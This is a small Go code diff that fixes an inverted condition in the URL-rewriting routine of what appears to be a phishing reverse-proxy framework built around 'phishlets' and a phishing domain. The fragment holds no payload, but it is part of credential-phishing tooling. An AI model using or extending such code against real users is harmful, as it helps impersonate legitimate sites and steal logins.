@@ -1032,7 +1032,7 @@ func (p *HttpProxy) patchUrls(pl *Phishlet, body []byte, c_type int) []byte {
 	re_url := regexp.MustCompile(MATCH_URL_REGEXP)
 	re_ns_url := regexp.MustCompile(MATCH_URL_REGEXP_WITHOUT_SCHEME)
 
-	if phishDomain, ok := p.cfg.GetSiteDomain(pl.Name); !ok {
+	if phishDomain, ok := p.cfg.GetSiteDomain(pl.Name); ok {
 		var replacers []Replacer
 		for _, ph := range pl.proxyHosts {
 			replacers = append(replacers, ph.BuildReplacer(c_type == CONVERT_TO_ORIGINAL_URLS, phishDomain))
